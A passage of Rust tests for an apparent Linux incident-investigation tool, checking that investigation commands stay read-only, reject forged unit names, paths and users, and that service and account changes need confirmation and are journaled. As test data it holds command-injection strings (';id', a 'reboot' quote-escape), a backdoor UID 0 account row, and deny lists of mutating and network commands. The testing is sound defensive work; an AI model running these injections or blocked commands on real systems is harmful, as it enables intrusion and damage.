        // dead process is reported absent rather than as a live identity.
        let state_check = command
            .find("case \"${rest%% *}\" in Z) printf 'ABSENT\\n'; exit 0;;")
            .unwrap();
        let start_read = command.find("start=$(printf").unwrap();
        assert!(state_check < start_read);
        assert!(command.starts_with("p='4242';"));
        // A snapshot that does come back still has to be three exact fields.
        assert!(parse_process_identity("4242\t42\tsleep\n").is_ok());
        assert!(parse_process_identity("4242\t\tsleep\n").is_err());
    }

    fn service_snapshot(
        active: &str,
        sub: &str,
        unit_file: &str,
        main_pid: u32,
        can_reload: bool,
    ) -> String {
        format!(
            "LoadState=loaded\nActiveState={active}\nSubState={sub}\nUnitFileState={unit_file}\nMainPID={main_pid}\nFragmentPath=/usr/lib/systemd/system/sshd.service\nCanReload={}\n",
            if can_reload { "yes" } else { "no" }
        )
    }

    #[test]
    fn service_investigation_catalog_replaces_every_legacy_read_action() {
        assert_eq!(ServiceInvestigationGroup::ALL.len(), 6);
        assert_eq!(ServiceInvestigationAction::ALL.len(), 19);
        assert_eq!(ServiceRuntimeAction::ALL.len(), 6);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let row_id = table.rows[0].id.clone();
        for action in ServiceInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(ServiceInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .service_investigation_request(&row_id, action)
                .unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
            let command = request.command();
            assert!(
                command.starts_with("n='sshd.service';"),
                "{action:?}: {command}"
            );
            for forbidden in [
                "systemctl start",
                "systemctl stop",
                "systemctl restart",
                "systemctl reload --",
                "systemctl enable",
                "systemctl disable",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        for action in ServiceRuntimeAction::ALL {
            assert!(!action.label().is_empty());
            let request = table.service_runtime_request(&row_id, action).unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
        }

        for malicious in ["sshd.service;id", "--help", "bad name.service"] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
                &format!("{malicious}\tactive\trunning\tforged"),
            );
            assert!(
                forged
                    .service_investigation_request(
                        &forged.rows[0].id,
                        ServiceInvestigationAction::Status,
                    )
                    .is_err()
            );
            assert!(
                forged
                    .service_runtime_request(&forged.rows[0].id, ServiceRuntimeAction::Stop,)
                    .is_err()
            );
        }
    }

    #[test]
    fn startup_and_timer_runtime_actions_are_closed_and_unit_typed() {
        let startup = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Autostart, 1).unwrap(),
            "sshd.service\tsshd.service\tenabled\tsystemd",
        );
        for action in ServiceRuntimeAction::AUTOSTART {
            let request = startup
                .service_runtime_request(&startup.rows[0].id, action)
                .unwrap();
            assert_eq!(request.unit(), "sshd.service");
            assert_eq!(request.action(), action);
        }
        assert!(
            startup
                .service_runtime_request(&startup.rows[0].id, ServiceRuntimeAction::Stop)
                .is_err()
        );

        let timer = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\tnext\tleft\tlast\tlogrotate.service",
        );
        for action in ServiceRuntimeAction::TIMER {
            let request = timer
                .service_runtime_request(&timer.rows[0].id, action)
                .unwrap();
            assert_eq!(request.unit(), "logrotate.timer");
            assert_eq!(request.action(), action);
        }
        assert!(
            timer
                .service_runtime_request(&timer.rows[0].id, ServiceRuntimeAction::Start)
                .is_err()
        );
    }

    #[test]
    fn service_snapshot_parser_is_strict_and_identity_bound() {
        let parsed = parse_service_snapshot(
            "sshd.service",
            &service_snapshot("active", "running", "enabled", 123, true),
        )
        .unwrap();
        assert_eq!(parsed.unit, "sshd.service");
        assert_eq!(parsed.main_pid, 123);
        assert!(parsed.can_reload);
        assert_eq!(service_snapshot_sha256(&parsed).len(), 64);

        for invalid in [
            "LoadState=not-found\nActiveState=inactive\nSubState=dead\nUnitFileState=disabled\nMainPID=0\nFragmentPath=\nCanReload=no\n",
            "LoadState=loaded\nActiveState=active;id\nSubState=running\nUnitFileState=enabled\nMainPID=1\nFragmentPath=/a\nCanReload=yes\n",
            "LoadState=loaded\nActiveState=active\nSubState=running\nUnitFileState=enabled\nMainPID=oops\nFragmentPath=/a\nCanReload=yes\n",
            "LoadState=loaded\nActiveState=active\nSubState=running\nUnitFileState=enabled\nMainPID=1\nFragmentPath=relative\nCanReload=yes\n",
        ] {
            assert!(parse_service_snapshot("sshd.service", invalid).is_err());
        }
    }

    #[tokio::test]
    async fn service_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let request = table
            .service_investigation_request(
                &table.rows[0].id,
                ServiceInvestigationAction::Environment,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_SERVICE_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_service(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_SERVICE_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_service(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn service_runtime_requires_exact_confirmation_and_unchanged_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tinactive\tdead\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Start)
            .unwrap();
        harness.set_execute_output(service_snapshot("inactive", "dead", "enabled", 0, true));
        let wrong_plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_service_runtime(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "enabled", 0, true),
            service_snapshot("active", "running", "enabled", 456, true),
        ]);
        let stale = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_service_runtime(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_service_runtime_is_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tinactive\tdead\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Start)
            .unwrap();
        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "enabled", 0, true),
            service_snapshot("inactive", "dead", "enabled", 0, true),
            String::new(),
            service_snapshot("active", "running", "enabled", 456, true),
        ]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().dangerous);
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert_eq!(outcome.unit, "sshd.service");
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-service")
        );
    }

    #[tokio::test]
    async fn timer_mask_is_planned_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\tnext\tleft\tlast\tlogrotate.service",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Mask)
            .unwrap();
        harness.set_execute_outputs([
            service_snapshot("inactive", "dead", "disabled", 0, false),
            service_snapshot("inactive", "dead", "disabled", 0, false),
            String::new(),
            service_snapshot("inactive", "dead", "masked", 0, false),
        ]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().dangerous);
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert_eq!(outcome.unit, "logrotate.timer");
        assert_eq!(outcome.action, ServiceRuntimeAction::Mask);
        assert!(outcome.verification.passed);
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn service_unit_file_change_restores_exact_prior_state_after_failed_readback() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Services, 1).unwrap(),
            "sshd.service\tactive\trunning\tOpenSSH",
        );
        let request = table
            .service_runtime_request(&table.rows[0].id, ServiceRuntimeAction::Enable)
            .unwrap();
        let disabled = service_snapshot("active", "running", "disabled", 456, true);
        harness.set_execute_output(disabled.clone());
        harness.set_execute_outputs([disabled.clone(), disabled.clone(), String::new()]);
        let plan = services
            .system_info()
            .plan_service_runtime(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_service_runtime(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(!outcome.verification.passed);
        assert!(outcome.restored_after_failed_verification);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 3);
        assert_eq!(
            entries.last().unwrap().phase,
            crate::operations::JournalPhase::Restored
        );
    }

    fn user_table() -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
            "alice\t1000\t1000\t/home/alice\t/bin/bash",
        )
    }

    fn login_table(source: &str) -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::LoginHistory, 1).unwrap(),
            &format!("alice\tpts/0\t{source}\t2026-08-12 10:00:00\tlogin"),
        )
    }

    fn user_snapshot(uid: u32, state: &str) -> String {
        format!("alice\t{uid}\t1000\t/home/alice\t/bin/bash\t{state}\toperator")
    }

    #[test]
    fn package_kernel_and_environment_catalogs_are_closed_read_only_and_typed() {
        let packages = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Packages, 1).unwrap(),
            "openssl\t3.0.0\t2026-08-12\tdpkg",
        );
        let package_row = packages.rows[0].id.clone();
        assert_eq!(PackageInvestigationAction::ALL.len(), 8);
        for action in PackageInvestigationAction::ALL {
            let request = packages
                .artifact_investigation_request(
                    &package_row,
                    ArtifactInvestigationAction::Package(action),
                )
                .unwrap();
            let command = request.command().unwrap();
            assert!(command.contains("p='openssl'"), "{action:?}: {command}");
            for forbidden in [
                "apt-mark hold",
                "apt changelog",
                "curl ",
                "wget ",
                "rpm -e \"$p\"",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        assert!(
            packages
                .artifact_investigation_request(
                    &package_row,
                    ArtifactInvestigationAction::KernelModule(
                        KernelModuleInvestigationAction::Info,
                    ),
                )
                .is_err()
        );

        let modules = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t1234\t2\tnormal",
        );
        let module_row = modules.rows[0].id.clone();
        assert_eq!(KernelModuleInvestigationAction::ALL.len(), 8);
        for action in KernelModuleInvestigationAction::ALL {
            let command = modules
                .artifact_investigation_request(
                    &module_row,
                    ArtifactInvestigationAction::KernelModule(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(
                command.contains("m='nf_conntrack'"),
                "{action:?}: {command}"
            );
            for forbidden in ["rmmod", "modprobe -r", ">> /etc/modprobe", "blacklist "] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        let environment = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::EnvVars, 2).unwrap(),
            "PATH\t/usr/bin:/bin\tnormal\nTOKEN\tattacker; id\twarning",
        );
        assert_eq!(EnvVarInvestigationAction::ALL.len(), 4);
        let path_row = environment.rows[0].id.clone();
        for action in EnvVarInvestigationAction::ALL {
            let command = environment
                .artifact_investigation_request(
                    &path_row,
                    ArtifactInvestigationAction::Environment(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("n='PATH'"), "{action:?}: {command}");
            assert!(!command.contains("su -"));
        }
        assert!(
            environment
                .artifact_investigation_request(
                    &environment.rows[1].id,
                    ArtifactInvestigationAction::Environment(
                        EnvVarInvestigationAction::PathDirectories,
                    ),
                )
                .is_err()
        );
        for forged in ["A;id", "A=B", "--help", "变量"] {
            let table = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::EnvVars, 1).unwrap(),
                &format!("{forged}\tvalue\twarning"),
            );
            assert!(
                table
                    .artifact_investigation_request(
                        &table.rows[0].id,
                        ArtifactInvestigationAction::Environment(
                            EnvVarInvestigationAction::TraceSource,
                        ),
                    )
                    .is_err()
            );
        }
    }

    #[test]
    fn persistence_artifact_catalogs_replace_legacy_read_actions_without_mutation_surface() {
        let assert_read_only = |command: &str| {
            for forbidden in [
                "systemctl enable ",
                "systemctl disable ",
                "systemctl start ",
                "systemctl stop ",
                "systemctl mask ",
                "chmod ",
                "chown ",
                "rm --",
                "mv --",
                "cp --",
                "crontab -",
                "eval ",
                "sh -c \"$cmd\"",
                "bash -c \"$cmd\"",
            ] {
                assert!(!command.contains(forbidden), "found {forbidden}: {command}");
            }
        };

        let startup = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Autostart, 1).unwrap(),
            "sshd.service\tsshd.service\tenabled\tsystemd",
        );
        assert_eq!(StartupInvestigationAction::ALL.len(), 18);
        for action in StartupInvestigationAction::ALL {
            let request = startup
                .artifact_investigation_request(
                    &startup.rows[0].id,
                    ArtifactInvestigationAction::Startup(action),
                )
                .unwrap();
            assert_eq!(request.action().tab(), SystemInfoTab::Autostart);
            let command = request.command().unwrap();
            assert!(command.contains("u='sshd.service'"));
            assert_read_only(&command);
        }

        let cron_command = "/usr/bin/id; touch /tmp/never-run";
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 1).unwrap(),
            &format!("root\t*/5 * * * *\t{cron_command}\t/etc/cron.d/audit"),
        );
        assert_eq!(cron.columns, ["用户", "时间表", "命令", "来源"]);
        assert_eq!(CronInvestigationAction::ALL.len(), 15);
        for action in CronInvestigationAction::ALL {
            let command = cron
                .artifact_investigation_request(
                    &cron.rows[0].id,
                    ArtifactInvestigationAction::Cron(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("cmd='/usr/bin/id; touch /tmp/never-run'"));
            assert!(!command.contains("; /usr/bin/id"));
            assert_read_only(&command);
        }

        let timer = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Timers, 1).unwrap(),
            "logrotate.timer\t2026-08-13 01:00\t1h\t2026-08-12 01:00\tlogrotate.service",
        );
        assert_eq!(TimerInvestigationAction::ALL.len(), 6);
        for action in TimerInvestigationAction::ALL {
            let command = timer
                .artifact_investigation_request(
                    &timer.rows[0].id,
                    ArtifactInvestigationAction::Timer(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("t='logrotate.timer'"));
            assert!(command.contains("g='logrotate.service'"));
            assert_read_only(&command);
        }

        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 1).unwrap(),
            "/root/.bashrc\troot\t1723500000\t12\tcurl http://invalid\twarning",
        );
        assert_eq!(ShellConfigInvestigationAction::ALL.len(), 6);
        for action in ShellConfigInvestigationAction::ALL {
            let command = shell
                .artifact_investigation_request(
                    &shell.rows[0].id,
                    ArtifactInvestigationAction::ShellConfig(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("p='/root/.bashrc'"));
            assert!(command.contains("line=12"));
            assert_read_only(&command);
        }

        let sudoers = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Sudoers, 1).unwrap(),
            "alice\tALL\talice ALL=(ALL) NOPASSWD: ALL\tyes\t/etc/sudoers.d/alice",
        );
        assert_eq!(SudoersInvestigationAction::ALL.len(), 8);
        for action in SudoersInvestigationAction::ALL {
            let command = sudoers
                .artifact_investigation_request(
                    &sudoers.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("user='alice'"));
            assert!(command.contains("src='/etc/sudoers.d/alice'"));
            assert_read_only(&command);
        }

        let suid = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 1).unwrap(),
            "/usr/bin/passwd\t4755\troot\t68208\t2026-08-12T00:00:00\tnormal",
        );
        assert_eq!(SuidFileInvestigationAction::ALL.len(), 8);
        for action in SuidFileInvestigationAction::ALL {
            let command = suid
                .artifact_investigation_request(
                    &suid.rows[0].id,
                    ArtifactInvestigationAction::SuidFile(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("p='/usr/bin/passwd'"));
            assert_read_only(&command);
        }

        let ssh_keys = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SshKeys, 1).unwrap(),
            "alice\tssh-ed25519\tAAAAC3NzaC1lZDI1NTE5AAAAIGhvc3RpbGVrZXlkYXRh\toperator\t/home/alice/.ssh/authorized_keys",
        );
        assert_eq!(SshKeyInvestigationAction::ALL.len(), 7);
        for action in SshKeyInvestigationAction::ALL {
            let command = ssh_keys
                .artifact_investigation_request(
                    &ssh_keys.rows[0].id,
                    ArtifactInvestigationAction::SshKey(action),
                )
                .unwrap()
                .command()
                .unwrap();
            assert!(command.contains("owner='alice'"));
            assert!(command.contains("f='/home/alice/.ssh/authorized_keys'"));
            assert!(!command.contains("id_rsa"));
            assert_read_only(&command);
        }
    }

    #[test]
    fn persistence_artifact_identities_reject_forged_units_paths_schedules_and_principals() {
        let rejected = [
            (
                SystemInfoTab::Autostart,
                "evil.service;id\tevil\tenabled\tsystemd",
                ArtifactInvestigationAction::Startup(StartupInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Cron,
                "root\t* * * * *;id\t/usr/bin/id\t/etc/cron.d/audit",
                ArtifactInvestigationAction::Cron(CronInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Cron,
                "root\t* * * * *\t/usr/bin/id\t/etc/passwd",
                ArtifactInvestigationAction::Cron(CronInvestigationAction::Details),
            ),
            (
                SystemInfoTab::Timers,
                "evil.timer;id\tnext\tleft\tlast\tevil.service",
                ArtifactInvestigationAction::Timer(TimerInvestigationAction::TimerStatus),
            ),
            (
                SystemInfoTab::ShellConfigs,
                "/tmp/profile\troot\t0\t1\tvalue\twarning",
                ArtifactInvestigationAction::ShellConfig(ShellConfigInvestigationAction::ViewFile),
            ),
            (
                SystemInfoTab::Sudoers,
                "alice;id\tALL\tline\tno\t/etc/sudoers",
                ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::ViewSource),
            ),
            (
                SystemInfoTab::SuidFiles,
                "relative/path\t4755\troot\t1\tnow\thigh",
                ArtifactInvestigationAction::SuidFile(SuidFileInvestigationAction::Details),
            ),
            (
                SystemInfoTab::SshKeys,
                "root\tssh-ed25519\tAAAAC3NzaC1lZDI1NTE5AAAAIGhvc3RpbGVrZXlkYXRh\tbad\t/root/.ssh/id_rsa",
                ArtifactInvestigationAction::SshKey(SshKeyInvestigationAction::Fingerprint),
            ),
        ];
        for (tab, row, action) in rejected {
            let table = parse_table(&SystemInfoRequest::new(tab, 1).unwrap(), row);
            assert!(
                table
                    .artifact_investigation_request(&table.rows[0].id, action)
                    .is_err(),
                "accepted forged {tab:?} row"
            );
        }

        let group = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Sudoers, 1).unwrap(),
            "%wheel\tALL\t%wheel ALL=(ALL) ALL\tno\t/etc/sudoers",
        );
        assert!(
            group
                .artifact_investigation_request(
                    &group.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::ViewSource,),
                )
                .is_ok()
        );
        assert!(
            group
                .artifact_investigation_request(
                    &group.rows[0].id,
                    ArtifactInvestigationAction::Sudoers(SudoersInvestigationAction::UserGroups,),
                )
                .is_err()
        );
    }

    #[tokio::test]
    async fn artifact_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t1234\t2\tnormal",
        );
        let request = table
            .artifact_investigation_request(
                &table.rows[0].id,
                ArtifactInvestigationAction::KernelModule(KernelModuleInvestigationAction::Dmesg),
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>remote</script>\n{}",
            "界".repeat(MAX_ARTIFACT_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_artifact(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>remote</script>"));
        assert!(result.output.len() <= MAX_ARTIFACT_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_artifact(&session, &request)
                .await
                .is_err()
        );
    }

    #[test]
    fn user_catalog_replaces_all_twenty_legacy_read_actions_without_mutation_tokens() {
        assert_eq!(UserInvestigationGroup::ALL.len(), 6);
        assert_eq!(UserInvestigationAction::ALL.len(), 20);
        let table = user_table();
        let row_id = table.rows[0].id.clone();
        let identity = table.user_identity(&row_id).unwrap();
        assert_eq!(identity.username, "alice");
        assert_eq!(identity.uid, 1000);
        assert_eq!(identity.home, "/home/alice");

        for action in UserInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(UserInvestigationGroup::ALL.contains(&action.group()));
            let request = table.user_investigation_request(&row_id, action).unwrap();
            let command = request.command();
            assert!(command.contains("u='alice'"), "{action:?}: {command}");
            for forbidden in [
                "passwd -l",
                "passwd -u",
                "userdel",
                "pkill",
                "sed -i",
                "iptables",
                "nft add",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }

        for row in [
            "alice;id\t1000\t1000\t/home/alice\t/bin/bash",
            "alice\t1000\t1000\trelative/home\t/bin/bash",
            "alice\tnan\t1000\t/home/alice\t/bin/bash",
        ] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
                row,
            );
            assert!(forged.user_identity(&forged.rows[0].id).is_err());
        }
    }

    #[test]
    fn login_catalog_is_typed_and_source_actions_require_a_real_ip_address() {
        assert_eq!(LoginInvestigationGroup::ALL.len(), 3);
        assert_eq!(LoginInvestigationAction::ALL.len(), 10);
        let table = login_table("203.0.113.9");
        let row_id = table.rows[0].id.clone();
        let identity = table.login_identity(&row_id).unwrap();
        assert_eq!(identity.username, "alice");
        assert_eq!(identity.source, Some("203.0.113.9".parse().unwrap()));
        for action in LoginInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(LoginInvestigationGroup::ALL.contains(&action.group()));
            let request = table.login_investigation_request(&row_id, action).unwrap();
            let command = request.command().unwrap();
            for forbidden in ["iptables", "nft add", "passwd -l", "userdel", "pkill"] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
            assert_eq!(
                command.contains("User no longer exists"),
                action.requires_current_user(),
                "historical source/global probes must remain usable after account deletion: {action:?}: {command}",
            );
        }

        let local = login_table("0.0.0.0");
        assert!(
            local
                .login_investigation_request(
                    &local.rows[0].id,
                    LoginInvestigationAction::UserDetails,
                )
                .is_ok()
        );
        assert!(
            local
                .login_investigation_request(&local.rows[0].id, LoginInvestigationAction::Whois,)
                .is_err()
        );
        for source in ["203.0.113.9;id", "--help", "host.example"] {
            let forged = login_table(source);
            assert!(forged.login_identity(&forged.rows[0].id).is_err());
        }
    }

    #[tokio::test]
    async fn user_and_login_investigations_are_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let users = user_table();
        let user_request = users
            .user_investigation_request(&users.rows[0].id, UserInvestigationAction::SuspiciousFiles)
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_USER_INVESTIGATION_CHARS)
        ));
        let user_result = services
            .system_info()
            .investigate_user(&session, &user_request)
            .await
            .unwrap();
        assert!(user_result.output.starts_with("<script>alert(1)</script>"));
        assert!(user_result.output.len() <= MAX_USER_INVESTIGATION_CHARS);
        assert!(user_result.truncated);

        let logins = login_table("203.0.113.9");
        let login_request = logins
            .login_investigation_request(&logins.rows[0].id, LoginInvestigationAction::AuthLogs)
            .unwrap();
        harness.set_execute_output("remote <b>text</b>".repeat(20_000));
        let login_result = services
            .system_info()
            .investigate_login(&session, &login_request)
            .await
            .unwrap();
        assert!(login_result.output.starts_with("remote <b>text</b>"));
        assert!(login_result.output.len() <= MAX_LOGIN_INVESTIGATION_CHARS);
        assert!(login_result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_user(&session, &user_request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn account_lock_requires_exact_confirmation_and_unchanged_snapshot() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = user_table();
        let request = table
            .user_account_request(&table.rows[0].id, UserAccountAction::Lock)
            .unwrap();
        harness.set_execute_output(user_snapshot(1000, "P"));
        let wrong_plan = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_user_account(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([user_snapshot(1000, "P"), user_snapshot(1001, "P")]);
        let stale = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_user_account(&session, stale, confirmation, services.operation_journal(),)
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn account_lock_and_unlock_are_journaled_and_readback_verified() {
        for (action, before, after) in [
            (UserAccountAction::Lock, "P", "L"),
            (UserAccountAction::Unlock, "L", "P"),
        ] {
            let root = TestRoot::new();
            let (services, session, harness) = bound_services(&root).await;
            let table = user_table();
            let request = table
                .user_account_request(&table.rows[0].id, action)
                .unwrap();
            harness.set_execute_outputs([
                user_snapshot(1000, before),
                user_snapshot(1000, before),
                String::new(),
                user_snapshot(1000, after),
            ]);
            let plan = services
                .system_info()
                .plan_user_account(&session, &request)
                .await
                .unwrap();
            assert!(plan.definition().restore_description.is_some());
            let confirmation = DangerousConfirmation::approve(plan.definition());
            let outcome = services
                .system_info()
                .execute_user_account(&session, plan, confirmation, services.operation_journal())
                .await
                .unwrap();
            assert!(outcome.verification.passed);
            assert!(!outcome.restored_after_failed_verification);
            let entries = services.operation_journal().entries().unwrap();
            assert_eq!(entries.len(), 2);
            assert!(
                entries
                    .iter()
                    .all(|entry| entry.source == "system-info-user")
            );
        }
    }

    #[test]
    fn account_delete_is_offered_for_every_account_but_root_in_the_user_inventory() {
        let users = |line: &str| {
            parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
                line,
            )
        };
        // An ordinary account, and a second UID 0 account — the classic
        // backdoor, which is exactly the one an operator needs to remove.
        for line in [
            "alice\t1000\t1000\t/home/alice\t/bin/bash",
            "sys-update\t0\t0\t/var/tmp\t/bin/sh",
        ] {
            let table = users(line);
            assert!(
                table
                    .user_account_request(&table.rows[0].id, UserAccountAction::Delete)
                    .is_ok(),
                "{line}"
            );
        }
        let root = users("root\t0\t0\t/root\t/bin/bash");
        assert!(
            root.user_account_request(&root.rows[0].id, UserAccountAction::Delete)
                .is_err()
        );
        // Locking stays available for root.
        assert!(
            root.user_account_request(&root.rows[0].id, UserAccountAction::Lock)
                .is_ok()
        );
        let login = login_table("198.51.100.7");
        assert!(
            login
                .user_account_request(&login.rows[0].id, UserAccountAction::Delete)
                .is_err()
        );
    }

    #[test]
    fn account_delete_keeps_the_home_directory_and_never_forces() {
        let command = user_account_command("alice'; reboot; '", UserAccountAction::Delete);
        assert!(
            command.starts_with("u='alice'\\''; reboot; '\\'''; "),
            "{command}"
        );
        assert!(command.contains("userdel \"$u\""));
        assert!(command.contains("deluser \"$u\""));
        for forbidden in [
            "userdel -r",
            "userdel -f",
            "--remove-home",
            "--force",
            "rm -",
            "passwd -l",
            "passwd -u",
        ] {
            assert!(!command.contains(forbidden), "{forbidden}: {command}");
        }
        assert!(
            user_account_command("alice", UserAccountAction::Lock).contains("passwd -l \"$u\"")
        );
        assert!(
            user_account_command("alice", UserAccountAction::Unlock).contains("passwd -u \"$u\"")
        );
        // Every delete first checks root is still UID 0.
        assert!(command.contains("getent passwd root") && command.contains("exit 79"));
    }

    #[test]
